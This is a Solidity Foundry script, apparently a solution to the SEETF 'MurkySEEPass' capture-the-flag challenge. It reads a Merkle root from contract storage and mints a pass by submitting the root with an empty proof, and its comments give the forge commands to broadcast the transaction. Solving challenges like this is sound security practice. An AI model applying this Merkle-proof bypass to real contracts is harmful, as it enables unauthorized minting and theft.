// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "./challenge/Setup.sol";

// forge script src/SEETF/MurkySEEPass/Exploit.s.sol:ExploitScript -vvvvv --private-key $PRIVATE_KEY --fork-url $RPC_URL
// forge script src/SEETF/MurkySEEPass/Exploit.s.sol:ExploitScript -vvvvv --private-key $PRIVATE_KEY --fork-url $RPC_URL --broadcast

contract ExploitScript is Script {
    function run() public {
        address setUpContractAddress = 0x498cB506f7505A7aBd5D95d43A5bED2C50D72BC5;
        Setup setup = Setup(setUpContractAddress);
        bytes32 root = vm.load(address(setup.pass()), bytes32(uint256(6)));
        bytes32[] memory proof = new bytes32[](0);

        vm.startBroadcast();
        setup.pass().mintSeePass(proof, uint256(root));
        vm.stopBroadcast();
    }
}
